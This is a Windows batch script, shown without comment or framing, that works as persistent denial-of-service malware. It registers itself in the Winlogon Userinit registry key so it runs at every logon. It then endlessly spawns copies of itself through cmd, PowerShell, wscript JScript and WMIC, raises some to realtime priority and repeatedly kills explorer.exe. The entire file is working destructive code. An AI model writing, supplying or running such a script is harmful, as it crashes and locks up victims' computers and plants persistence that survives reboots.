@echo off

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 

:loop

%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0

:%|start%

start %0
%0

set comspec=%0
cmd /c start %0
%comspec%

start cmd /c "%0"

start powershell -Command "while(1){Start-Process cmd.exe}"

start "" /min cmd /c %0

start "" /min powershell -c "while(1){Start-Process cmd -Args '/c %0'}"

start "" /min wscript.exe //e:jscript "while(1){new ActiveXObject('WScript.Shell').Run('cmd /c %0',0)}"

wmic process call create "cmd.exe /c %0"

start "" "%~f0"

start cmd /c "%0 & %0 & %0"

for /l %%x in (0,0,0) do start %0

start "" /realtime cmd /c "for /l %%x in (1,0,500) do (start /realtime cmd /c %0 & %0)"
powershell -WindowStyle Hidden -Command "while(1){Get-Process -Name 'explorer' -ErrorAction SilentlyContinue|Stop-Process -Force;Start-Process -WindowStyle Hidden -PassThru cmd -Args '/c %0'|ForEach-Object{$_.ProcessorAffinity=1;$_.PriorityClass='Realtime'}}"

goto loop
